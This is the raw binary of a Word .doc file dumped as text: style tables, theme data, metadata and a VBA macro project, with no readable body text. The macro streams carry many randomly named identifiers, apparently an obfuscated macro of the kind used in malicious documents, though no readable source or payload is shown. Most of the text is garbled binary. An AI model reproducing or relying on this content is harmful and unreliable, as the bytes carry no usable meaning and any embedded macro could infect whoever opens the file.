H  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  6  °  6  2     À  Ð  à  ð          0  @  P  `  p  €    À  Ð  à  ð       2  (  Ø  è     0  @  P  `  p  €    À  Ð  à  ð          0  @  P  `  p  €    À  Ð  à  ð          0  @  P  `  p  €    À  Ð  à  ð          0  @  P  `  p  €    À  Ð  à  ð          0  @  P  `  p  €    À  Ð  à  ð          0  @  P  `  p  €    8  X  ø      V  ~      OJ PJ QJ _HmH	nH	sH	tH	    J  `ñÿ J          N o r m a l      d ¤È  CJ _HaJ mH	sH	tH	                  D A òÿ¡ D 
        D e f a u l t   P a r a g r a p h   F o n t     R i óÿ³ R 
      0 T a b l e   N o r m a l    ö  4Ö 
l 4Ö   aö      ( k ôÿÁ (  
      0  N o   L i s t         PK     ! éÞ¿ÿ        [Content_Types].xml¬‘ËNÃ0E÷Hüƒå-Jœ²@%é‚ÇŽÇ¢|ÀÈ™$ÉØ²§Uû÷LÒTB¨ l,Ù3÷ž;ãr½ µÃ˜œ§J¯òB+$ëG]¥ß7OÙ­V‰<a¥˜ôº¾¼(7‡€I‰šR¥{æpgL²=Žr¤Òú8Ë5v&€ý€ÍuQÜë‰‘8ãÉC×å¶°X=îåù˜$â´º?6N¬JCƒ³À’Ôì¨ùFÉB.Ê¹'õ.¤+‰¡ÍYÂTù°è^e5Ñ5¨Þ òŒÃ°‰_Ïg -æ¿;ž‰ìÛÖYl¼ÝŽ²Ž|6^ÌNÁÿ`õ?èÓÌ[  ÿÿ PK     ! ¥Ö§çÀ   6     _rels/.rels„ÏjÃ0‡ï…½ƒÑ}QÒÃ%v/¥C/£} á(h"ÛëÛOÇ
»„¤ï÷©=þ®‹ùá”ç šªÃâC?Ëháv=¿‚É…¤§%[xp†£{Ûµ_¼PÑ£<Í1¥H¶0•ˆÙO¼R®BdÑÉÒJEÛ4b$§‘q_×˜žà6LÓõR×7`®¨Éÿ³Ã0ÌžOÁ¯,åEn7”Liäb¡¨/ãS½¨eªÔÐµ¸ùÖý  ÿÿ PK     ! ky–ƒ   Š      theme/theme/themeManager.xmlÌM
Ã @á}¡wÙ7c»(Eb²Ë®»ö CœAÇ ÒŸÛ×åãƒ7ÎßÕ›K
Y,œ 
ŠeÍ.ˆ·ð|,§¨ÚHÅ,láÇæéxÉ´ßIÈsQ}#Õ…­µÝ Öµ+Õ!ï,Ý^¹$j=‹GWèÓ÷)âEë+&
8ý  ÿÿ PK     ! 0ÝC)¨  ¤     theme/theme/theme1.xmlìYOoÛ6¿Øw toc'v uŠØ±›-MÄn‡i‰–ØP¢@ÒI}Úã€Ãºa‡Øm‡a[Ø¥û4Ù:lÐ¯°GR’ÅX^’6ØŠ­>$ùãûÿ©«×îÇ!)OÚ^ýrÍC$ñy@“°íÝö/­yH*œ˜ñ„´½)‘Þµ÷ß»Š×UDb‚`}"×qÛ‹”J×—–¤ÃX^æ)I`nÌEŒ¼Šp)øèÆli¹V[]Š1M<”àÈÞ©OÐP“ô6râ=¯‰’zÀgb Ig…Á uSÙebÖö€OÀ†ä¾òÃRÁDÛ«™Ÿ·´qu	¯g‹˜Z°¶´®o~ÙºlAp°lxŠpT0­÷­+[}`j×ëõº½zAÏ °ïƒ¦V–2ÍF­ÞÉi–@öqžv·Ö¬5\|‰þÊœÌ­N§Óle²X¢dsøµÚjcsÙÁÅ7çðÎf·»êà
ÈâWçðý+­Õ†‹7 ˆÑä`­ÚïgÔÈ˜³íJøÀ×j|†‚h(¢K³óD-Šµßã¢ 
dXÑ©iJÆØ‡(îâx$(Öð:Á¥;äË¹!ÍI_ÐTµ½S1£÷êù÷¯ž?EÇž?øéøáÃã ?ZBÎªmœ„åU/¿ýìÏÇ£?ž~óòÑÕxYÆÿúÃ'¿üüy5Òg&Î‹/ŸüöìÉ‹¯>ýý»GðMGeøÆD¢›äíó3Vq%'#q¾ÃÓòŠÍ$”8ÁšKýžŠôÍ)f™w9:Äµàå£
x}rÏx‰‰¢œw¢ØîrÎ:\TZaGó*™y8IÂjæbRÆíc|XÅ»‹Ç¿½I
u3KGñnD1÷NIBÒsü€
íîRêØu—ú‚K>Vè.EL+M2¤#'šf‹¶i~™Véþvl³{ u8«Òz‹ºHÈ
Ì*„æ˜ñ:ž(W‘â˜•
~«¨JÈÁTøe\O*ðtHG½€HYµæ– }KNßÁP±*Ý¾Ë¦±‹ŠTÑ¼9/#·øA7ÂqZ…Ð$*c? ¢íqUßån†èwðNºû%Ž»O¯·ièˆ4=3¾¼N¸¿ƒ)cbJ
u§VÇ4ù»ÂÍ(TnËáâ
7”Ê_?®ûm-Ù›°{UåÌö‰B½w²<w¹èÛ_·ð$Ù#ó[Ô»âü®8{ÿùâ¼(Ÿ/¾$Ïª0hÝ‹ØFÛ´ÝñÂ®{L¨)#7¤i¼%ì=Aõ:sâ$Å),àQg20pp¡Àf
\}DU4ˆp
M{ÝÓDB™‘%J¹„Ã¢®¤­ñÐø+{ÔlêCˆ­«]Øá=œŸ5
2FªÐhsF+šÀY™­\Éˆ‚n¯Ã¬®…:3·ºÍE‡[¡²6±9”ƒÉÕ`°°&45Z!°ò*œù5k8ì`Fmwë£Ü-Æé"á€d>ÒzÏû¨nœ”ÇÊœ"ZúàxŠÕJÜZšìp;‹“ÊìØåÞ{/å<óP;™Ž,)''KÐQÛk5—›òqÚöÆpN†Ç8¯KÝGbÂe“¯„
ûS“ÙdùÌ›­\17	êpõaí>§°S R!Õ–‘

3•… K4'+ÿrÌzQ
TT£³I±²Áð¯Ivt]KÆcâ«²³K#Úvö5+¥|¢ˆDÁ±‰ØÇà~ª O@%\w˜Š _ànN[ÛL¹Å9Kºò˜ÁÙqÌÒgåV§hžÉn
R!ƒy+‰ ºUÊn”;¿*&å/H•rÿÏTÑû	Ü>¬Ú>\
Œt¦´=.TÄ¡
¥õû S; Zà~¦!¨à‚ÚüäPÿ·9gi˜´†C¤Ú§!ö#	Bö ,™è;…X=Û»,I–2UW¦Vì9$l¨kàªÞÛ=A¨›j’•ƒ;î{–A£P79å|s*Y±÷Úø§;›Ì ”[‡MC“Û¿±hf»ª]o–ç{oY=1k³yV ³ÒVÐÊÒþ5E8çVk+ÖœÆËÍ\8ðâ¼Æ0X4D)Ü!!ý ö?*|f¿vè
uÈ÷¡¶"øx¡‰AØ@T_² ÒÒŽ q²ƒ6˜4)kÚ¬uÒVË7ëît¾'Œ­%;‹¿Ïiì¢9sÙ9¹x‘ÆÎ,ìØÚŽ-45xödŠÂÐ8?ÈÇ˜Ïdå/Y|t½ß&LILðJ`è¡ & ù-G³tã/   ÿÿ PK     ! 
ÑŸ¶     '   theme/theme/_rels/themeManager.xml.rels„M
Â0„÷‚wooÓº‘&ÝˆÐ­Ô„ä5
6?$Qìí
®,.‡a¾™i»—Éc2Þ1hª:é•qšÁm¸ìŽ@RN‰Ù;d°`‚Žo7íg‘K(M&$R(.1˜r'J“œÐŠTù€®8£Vä"£¦AÈ»ÐH÷u} ñ›|Å$½b{Õ –Pšÿ³ý8‰g/]þQAsÙ…(¢ÆÌà#›ªLÊ[ººÄß   ÿÿ PK-      ! éÞ¿ÿ                      [Content_Types].xmlPK-      ! ¥Ö§çÀ   6               0  _rels/.relsPK-      ! ky–ƒ   Š                  theme/theme/themeManager.xmlPK-      ! 0ÝC)¨  ¤               Ö  theme/theme/theme1.xmlPK-      ! 
ÑŸ¶     '             ²	  theme/theme/_rels/themeManager.xml.relsPK      ]  ­
    <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<a:clrMap xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>       
     ÿÿÿÿ                  ð8     ð                    @ ñ   ÿÿ    ÿ €€€ ÷    ð’    ð         ð0    ð(    	ð                    
ð          ðB    
ð        S ð   ¿   Ë    ÿ   	   ?    ð                                         å          ˆ5e ”UŸ                  ÿ@ €                                         P   @  ÿÿ     U n k n o w n ÿÿ            ÿÿ     ÿÿ   ÿÿ    ÿÿ   ÿÿ       G  ÿ. àCx À	       ÿ      T i m e s   N e w   R o m a n   5                     €    S y m b o l   3.  ÿ* àCx À	       ÿ      A r i a l   7.  ÿ àÿ¬ @       Ÿ      C a l i b r i   A                                   C a m b r i a   M a t h   "  1ˆ ðÐ  h    Sid§Sid§                                          ! ð                                                                                                                                                                                                                                                                                                                          ´ ´ 0                                                                                         Jƒ ð  üý                        HP    	ðÿ 	$P  ä  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ”UŸ    2                     !                             x   x                         Ü   ÿÿ                j n m n G w  W i n d o w s   U s e r                                                                                                                                                                                                                                                                                             þÿ                      à…ŸòùOh«‘ +'³Ù0   p              ˜      ¤      °      À      Ì       Ø      è   	           
   ,     8  
   D     P     X     `     h     ä                            jnmnGw                            Normal        Windows User          1         Microsoft Office Word   @           @    Mš!ÓÓ@    Mš!ÓÓ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          þÿ                      ÕÍÕœ.“— +,ù®0   ø   
      p      x      „      Œ      ”      œ      ¤      ¬      ´      ¼      Ä   
   Ì      Ù      ä               ø*                                                                          Title                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      þÿÿÿ	   
         
                                                             !   "   #   $   %   &   '   (   )   *   +   ,   -   .   /   0   1   2   3   4   5   6   7   8   9   :   ;   <   =   >   ?   @   A   B   C   D   E   F   G   H   I   J   K   L   M   N   O   P   Q   R   S   T   U   V   W   X   Y   Z   [   \   ]   ^   _   `   a   b   c   d   e   f   g   h   i   j   k   l   m   n   o   p   q   r   s   t   u   v   w   x   y   z   {   |   }   ~      €      ‚   ƒ   „   …   †   ‡   ˆ   ‰   Š   ‹   Œ      Ž         ‘   ’   “   ”   •   –   —   ˜   ™   š   ›   œ      ž   Ÿ       ¡   ¢   £   ¤   ¥   ¦   §   ¨   ©   ª   «   ¬   ­   ®   ¯   °   þÿÿÿ²   ³   ´   µ   ¶   ·   ¸   ¹   º   »   ¼   ½   þÿÿÿ¿   À   Á   Â   Ã   Ä   Å   þÿÿÿÇ   È   É   Ê   Ë   Ì   Í   þÿÿÿýÿÿÿýÿÿÿÑ   Ò   ¦  þÿÿÿÕ   ×   ýÿÿÿú   Ù   Ú   Û   Ü   Ý   Þ   ß   à   á   â   ã   ä   å   æ   ç   è   é   ê   ë   ì   í   î   ï   ð   ñ   ò   ó   ô   õ   ö   ÷   ø   ù   Ô   û   ü   ý   þ   ÿ      R o o t   E n t r y                                              ÿÿÿÿÿÿÿÿ   	     À      F             X´!ÓÓ¤  €      D a t a                                                         
 ÿÿÿÿÿÿÿÿÿÿÿÿ                                       2P     1 T a b l e                                                          ÿÿÿÿÿÿÿÿ                                    ±   ø      W o r d D o c u m e n t                                                ÿÿÿÿ                                                S u m m a r y I n f o r m a t i o n                           ( ÿÿÿÿÿÿÿÿÿÿÿÿ                                    ¾           D o c u m e n t S u m m a r y I n f o r m a t i o n           8    ÿÿÿÿÿÿÿÿ                                    Æ          M a c r o s                                                         
                          CV´!ÓÓ X´!ÓÓ            V B A                                                             ÿÿÿÿÿÿÿÿ                       CV´!ÓÓ X´!ÓÓ            T h i s D o c u m e n t                                          
   	   ÿÿÿÿ                                    Ø   [     _ V B A _ P R O J E C T                                           ÿÿÿÿÿÿÿÿÿÿÿÿ                                    Š  /?      d i r                                                             ÿÿÿÿÿÿÿÿÿÿÿÿ                                        	      P R O J E C T w m                                                 ÿÿÿÿÿÿÿÿÿÿÿÿ                                    	   )                                þÿÿÿþÿÿÿ      
         þÿÿÿ   þÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ .  ¶  LMVofAsyucLphOZo¬  ¬   $ ú  ' 2. ¶  BatTuwXghQaiSmPOCGD $ 6 ' 4  x   ¬  $ 0 ' 8  ¶  hZxZofdppdcZaH$ 6 ' :    ¶  pPWGYgALyTn ¬   $ > ' <  ¶  xXHaYVlayCuuZkjCi $ B ' @¶  PtYwReVssPhzLPlAQ ¬  $ , ' D    ¬  $ 0 ' F  ¬  $ 0 ' H  ¶  afsEZJPlgBksslOkT ¬  ¬  $ ú  ' J¶ 
 LxuUMtRhEi¬  ¬  $ ú  ' L¶ 
 EjqkHRQQuJmcG ¶  Ejqk¶  iYybEI$ P ' N  ¶  brfwKlGODjFdARK $ T ' R  ¶  LfYKOwiKAUSmpDepSVw $ T ' V      ¶  fHLXccfzZzXKfti $ Z ' X  ¬ 	 $ 0 ' \  ¶  RTymuoQhKLOsiVw $ B ' ^  ¶  aOpeQFOiRusI¬  $ , ' `  ¶  KwCBIBFruDzZVa$ T ' b    ¶ 
 aEvAUjWHepmHC ¶  aEvA¶  OwLcZz$ P ' d    f¬ 1 ¬   œ       ¶  bQmhHhzffXbLvUzUMH¶  bQmh¶  tgnA$ P ' h¶  bQmhHhzffXbLvUzUMH$ B ' hk ÿÿÐ   ¶  VUhmkFlrmFXCjIU ¶  VUhm¶   DsprfPA $ P ' j      ¶  hKWzsaGGjxjIvWdDsyG $ T ' l      ¶ 
 lYbYdjIqrMJcc ¬  ¬  $ ú  ' n    ¶  GcaXtiWDGWjI$ T ' p      ¶  jWenprXivEbOQpHXGi$ 6 ' r¶ 
 zIwMmSDtcolfX ¬   $ > ' t¶ 
 MnMvxIVpgC$ Z ' v¶                  	  
      
                                         !  "  #  $  %  &  '  (  )  *  +  ,  -  .  /  0  1  2  3  4  5  6  7  8  9  :  ;  <  =  >  ?  @  A  B  C  D  E  F  G  H  I  J  K  L  M  N  O  P  Q  R  S  T  U  V  W  X  Y  Z  [  \  ]  ^  _  `  a  b  c  d  e  f  g  h  i  j  k  l  m  n  o  p  q  r  s  t  u  v  w  x  y  z  {  |  ~  ýÿÿÿ  €   TxobfMaqJgrCRprzyE$ B ' x¶  RhWiCpAGYLhiYSKIoz¬  $ Ü  ' z    ¶  yBpGOZkZdKJzbpk $ T ' |  ¶  VyqZCEdEkPBE$ Z ' ~      ¶  xfzrIgnpWDvZpPel¬  $ Ü  ' €      ¶ 
 MngsiDRkIbpfV $ B ' ‚    ¶  MqEUDadWJQbjeVAvHT¬  ¬  $ ú  ' „¶ 
 HIbDcWbpnOzqG ¬  ¬  $ ú  ' †    ¶ 
 HoMdaySFCwYMP ¶  HoMd¶  HIuKI $ P ' ˆ  ¶  fpYoBnrzvdYhKDS ¬  $ , ' Š      ¬  $ 0 ' Œ  ¶  fKFgOMBKWqen¬  $ Ü  ' Ž  ¶  FySkBVIBuigGkMrW¶  FySk¶  GOxvM $ P ' ¶  cwEGOdLgBVvwHLqQHFB $ 6 ' ’      ¶ 
  ð   ö  Ô   Ú  ÿÿÿÿý  ¥à         +Î»  ÿÿ£  ˆ   ¶ ÿÿ    ÿÿÿÿ    ÿÿÿÿÿÿ                                                                   ÿÿÿÿÿÿÿÿ   ÿÿÿÿx                                   ÿÿ    ME  ÿÿÿÿÿÿ    ÿÿ    ÿÿ    ß ÿÿ     ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ(    S"ÿÿÿÿ   Sÿÿÿÿ   S"ÿÿÿÿ    <ÿÿÿÿ  ÿÿ     ( 1 N o r m a l . T h i s D o c u m e n t     ÿÿÿÿ  €þÿÿÿÿÿ ÿÿ(   ÿÿ        ÿÿÿÿÿÿÿÿ       %   ,(   ÿÿÿÿ    ÿÿÿÿÿÿÿÿ        ÿÿÿÿ    p    ÿÿÿÿÿÿ÷     ¼   iƒþÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ        ÌÐ   ÿÿÿÿ    ÿÿÿÿÿÿÿÿ        ÿÿÿÿ    ÿÿÿÿÿÿÿÿÿÿÿÿ     ”     ,ÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ        ÿÿÿÿ       ÿÿÿÿÿÿ4    ¼   Iƒž ÿÿÿÿÿÿÿÿÿÿ    0  €   iƒþÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    0   „ÿÿÿÿÿÿÿÿ€                               h   ÿÿÿÿp    ÿÿ           0   ÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿÐ   ÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ        ÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ      ß                                                            þÊ KB                   (    &   8    "   `       ˆ       ˜       ¸        Ø    $   ø              0   (   @       h   .   ˆ      ¸   "   Ø                    0      P      p   .         À   0   Ø             (   2   0   "   h   $         ¸       Ø       ø             0   $   P      x      ˜   "   ¸      à   (       $   (   .   P   "   €      ¨      ¸   0   Ø   "         0   $   H      p         $       (   È       ð             0       P    2   h            4   À    "   ø              (       8   $   X   &   €      ¨      ¸      Ø   6   ð   "   (	   ,   P	      €	       	       ¨	       È	   $   è	      
        
      @
      `
   2   x
       °
      Ð
       Ø
      ø
   ,         @      `   "   h            °   *   È      ø                  8   $   H      p   .          À   .   à      
       0
   &   P
      x
   "   
      ¸
      È
      Ø
      ø
            0   (   P       x   $   ˜   $   À      è   .          0      P      X      x   "   ˆ   0   °      à   "          (   "   H   "   p   "   ˜      À   $   à         *   (      X   $   x          ,   ¸      è                  0      @      H   0   `         "   °      Ø      ø         (   (      P   (   h            ¨      °      À       Ð      ð   .       *   0   "   `   $   ˆ   $   °   "   Ø                   0      P      p       ˆ       ¨   $   È   "   ð   
         (   *   @      p   0         À      à      è             (       H   "   h              °   "   Ð   $   ø          0   8      h      ˆ                2   ¸       ð         "         @   *   X      ˆ   .          Ð      ð      ø            (   .   @      p   .         À      à   "   è   4         H   6   `   "   ˜      À      È   *   à            (      0      P      p   $         ¸      Ø      ø         &   8      `   .   €      °   &   Ð   "   ø   .          P       p   €	     ÿÿÿÿ              €	     ÿÿÿÿ"    ¨       °      Ð      è                  8      P   2   h           ,   À      ð          ,       $   H       p       €    2   ˜    "   Ð       ø        !        !      @!      `!   &   p!   .   ˜!      È!      è!   *    "      0"      H"   (   P"      x"      ˜"   4   °"       è"   0   #      8#      X#      `#   2   €#   $   ¸#   
   à#      ð#   .   $      8$      X$      `$   2   x$      °$      Ð$      Ø$   ,   ð$       %      @%      H%   0   `%      %      °%        ¸%      Ø%   .   ð%       &   2   @&      x&      ˜&        &      À&   $   Ð&       ø&      '   .   0'      `'      €'   "   ˆ'   .   °'       à'       (       (   $   @(       h(       ˆ(   "   ¨(      Ð(   0   ð(   2    )      X)      h)      p)   .   ˆ)      ¸)      Ø)       è)   &   *       0*   2   P*   &   ˆ*      °*       Ð*       ð*   "   +   "   8+      `+   2   x+       °+      Ð+      Ø+      è+       ,      (,   .   @,      p,      ,   4   ˜,      Ð,      ð,   *   -      8-      P-   "   X-   "   €-      ¨-   &   È-   
   ð-       .      .      0.      P.       p.      .      °.      Ð.      à.   $   ð.      /       8/      X/      x/      ˜/      ¸/   &   Ø/       0      0   €	     ÿÿÿÿ    0      00       @0   $   `0   €	     ÿÿÿÿ    ˆ0      ˜0      ¸0   €	     ÿÿÿÿ    È0      Ø0      ø0   2   1       H1      h1   €	     ÿÿÿÿ    p1   "   €1   €	     ÿÿÿÿ    ¨1   F   ¸1       2       2      02   €	     ÿÿÿÿ     P2      p2       €2        2   €	     ÿÿÿÿ    À2   "   Ð2   €	     ÿÿÿÿ    ø2   $   3   0   03   €	     ÿÿÿÿ    `3      p3   €	     ÿÿÿÿ    €3      3      °3   €	     ÿÿÿÿ    À3      Ð3   €	     ÿÿÿÿ    ð3   "    4   €	     ÿÿÿÿ "   (4      P4   *   `4   €	     ÿÿÿÿ    4   "    4      È4   €	     ÿÿÿÿ    Ø4      è4   $   5   €	     ÿÿÿÿ    05       @5      `5   €	     ÿÿÿÿ    €5      5   *    5   €	     ÿÿÿÿ    Ð5      à5   ,   ð5   €	     ÿÿÿÿ     6      06   2   H6       €6   0    6      Ð6      ð6   €	     ÿÿÿÿ    ø6   .   7   €	     ÿÿÿÿ    87   6   H7      €7   €	     ÿÿÿÿ     7   0   °7   €	     ÿÿÿÿ    à7      ð7   .   8      88      X8   &   `8   €	     ÿÿÿÿ    ˆ8      ˜8      ¸8   €	     ÿÿÿÿ    Ø8      è8      9   2    9      X9      x9   €	     ÿÿÿÿ    €9   *   9      À9       Ð9   €	     ÿÿÿÿ    ð9       :   $   :   "   8:   €	     ÿÿÿÿ    `:      p:       €:   €	     ÿÿÿÿ     :   D   °:      ø:       ;   &   (;   €	     ÿÿÿÿ    P;       `;   "   €;   €	     ÿÿÿÿ    ¨;       ¸;   "   Ø;   €	     ÿÿÿÿ     <      <   $    <   €	     ÿÿÿÿ    H<      X<   2   p<      ¨<   .   È<      ø<      =   "    =   €	     ÿÿÿÿ    H=   ,   X=   €	     ÿÿÿÿ    ˆ=      ˜=   €	     ÿÿÿÿ    ¸=       È=      è=   €	     ÿÿÿÿ    >   $   >   €	     ÿÿÿÿ    @>      P>       `>   €	     ÿÿÿÿ    €>      >   $   °>   €	     ÿÿÿÿ    Ø>   "   è>   "   ?   €	     ÿÿÿÿ    8?   ,   H?   ,   x?   €	     ÿÿÿÿ    ¨?       ¸?      Ø?   .   ð?       @      @@   €	     ÿÿÿÿ    H@       X@   2   x@   €	     ÿÿÿÿ    °@      À@   &   Ð@   €	     ÿÿÿÿ    ø@      A   €	     ÿÿÿÿ    A      (A      8A      HA   €	     ÿÿÿÿ    XA   >   hA      ¨A   "   ¸A   0   àA   €	     ÿÿÿÿ    B   (    B   €	     ÿÿÿÿ    HB   $   XB      €B   .   ˜B      ÈB   4   èB        C      @C   €	     ÿÿÿÿ    HC   &   XC      €C   €	     ÿÿÿÿ     C       °C   0   ÐC   €	     ÿÿÿÿ     D       D   €	     ÿÿÿÿ    0D   .   @D       pD   €	     ÿÿÿÿ    D       D   $   °D   €	     ÿÿÿÿ    ØD      èD      E   €	     ÿÿÿÿ     E   0   0E   €	     ÿÿÿÿ    `E      pE   €	     ÿÿÿÿ    E       E      ÀE   €	     ÿÿÿÿ    ØE      øE   2   F   "   HF   .   pF       F      ÀF      ÈF   "   ØF   €	     ÿÿÿÿ     G      G      (G   €	     ÿÿÿÿ    HG      XG   "   xG   €	     ÿÿÿÿ     G       °G      ÐG   €	     ÿÿÿÿ    èG      øG   €	     ÿÿÿÿ    H       H       8H   €	     ÿÿÿÿ    XH   0   hH   €	     ÿÿÿÿ    ˜H   .   ¨H   €	     ÿÿÿÿ    ØH   .   èH   "   I   €	     ÿÿÿÿ    @I      PI      pI   €	     ÿÿÿÿ    I      °I      ÀI      ÐI   2   ðI   €	     ÿÿÿÿ    (J      8J      PJ   €	     ÿÿÿÿ     pJ      J        J   $   ÀJ   €	     ÿÿÿÿ    èJ      K   "   K      @K      PK   0   hK       ˜K   0   ¸K      èK      L   $   L   €	     ÿÿÿÿ    8L   &   HL       pL   €	     ÿÿÿÿ    L   "    L   €	     ÿÿÿÿ    ÈL      ØL   0   ðL       M   0   @M      pM      M      ˜M   €	     ÿÿÿÿ    ¸M      ÈM   €	     ÿÿÿÿ    èM      øM   €	     ÿÿÿÿ    N      (N   X   8N      N       N      °N       ÀN       àN   €	     ÿÿÿÿ     O      O        O   €	     ÿÿÿÿ    @O      PO      pO   €	     ÿÿÿÿ    ˆO      ˜O      ¸O   €	     ÿÿÿÿ    ØO      èO   €	     ÿÿÿÿ    P       P   €	     ÿÿÿÿ    8P      HP   €	     ÿÿÿÿ    XP      hP   €	     ÿÿÿÿ    xP      ˆP   &   ¨P   €	     ÿÿÿÿ    ÐP      àP       Q   €	     ÿÿÿÿ     Q       0Q   .   PQ   €	     ÿÿÿÿ    €Q      Q   €	     ÿÿÿÿ     Q       °Q   &   ÐQ   €	     ÿÿÿÿ $   øQ       R       0R      PR   0   hR      ˜R   0   ¸R      èR      S   €	     ÿÿÿÿ    S        S   "   @S   €	     ÿÿÿÿ    hS       xS      ˜S   €	     ÿÿÿÿ    ¸S      ÀS   €	     ÿÿÿÿ 
   àS   €	     ÿÿÿÿ    ðS       T   ,   (T   &   XT      €T   *   ˜T      ÈT      àT      èT      U   &   (U   2   PU   "   ˆU   $   °U       ØU      øU   .   V      HV   2   hV       V      °V      ÐV   &   ðV      W       (W      HW   "   hW       W   ,   °W      àW       ðW      X   ,   (X      XX   0   xX      ¨X      ÈX   &   ÐX   
   øX      Y   .    Y      PY   ,   pY       Y      ÀY        ÈY       èY    $    Z        (Z       HZ        XZ        xZ       ˜Z       ¸Z      ØZ   "   ðZ   4   [      P[       `[   $   €[      ¨[   ,   À[      ð[      \      \      (\   "   H\   .   p\   .    \   "   Ð\   $   ø\       ]      0]      P]   $   p]      ˜]      ¸]      Ø]   .   ð]       ^   2   @^   "   x^       ^      ¨^       ¸^       Ø^   
   ø^    (   _    $   0_      X_   2   p_      ¨_   0   È_      ø_      `    ,    `       P`    $   p`    "   ˜`      À`   2   Ø`   "   a      8a       @a    6   `a       ˜a      ¨a       ¸a       Øa      øa       b      0b      Pb      `b      €b       b   *   Àb      ðb      c   6   (c   "   `c   ,   ˆc      ¸c      Øc   0   àc   "   d   $   8d   &   `d      ˆd      ˜d   *   °d      àd       e   $   e   "   0e      Xe   "   he       e      °e      Èe   &   Øe       f      f   .   0f      `f   ,   €f      °f      Ðf   .   Øf      g      g        g       @g    &   `g    &   ˆg    0   °g       àg    .    h        0h       Ph      ph   .   ˆh      ¸h      Øh        àh         i        i      @i      Pi       `i      €i        i   "   Ài      èi      øi       j      0j      Pj   ,   hj      ˜j      ¸j      Àj   2   Øj       k   0   0k      `k      €k      ˆk   4   ¨k   0   àk      l   (    l      Hl   $   hl       l   $   °l      Øl      èl   0    m      0m   .   Pm      €m       m      ¨m      Èm      Øm        àm        n    "    n       Hn        hn      ˆn   .    n      Ðn   2   ðn      (o      Ho       Po        po    0   o       Ào       Ðo    4   èo       p   2   8p      pp   *   p      Àp      àp      èp   *    q      0q      Hq   €	     ÿÿÿÿ    Pq  B    Xq      `q   "   xq       q   .   ¸q      èq   .   r      8r      Xr   0   `r      r   *   ¨r      Ør   ,   ðr       s      @s   0   Hs   2   xs   2   °s   4   ès   *    t   2   Pt      ˆt       t   ,   Àt      ðt   2   u   "   Hu   4   pu      ¨u   ,   Àu      ðu   4   v   "   Hv      pv      xv      v      °v   *   Èv      øv      w        w   *   @w   ,   pw       w   
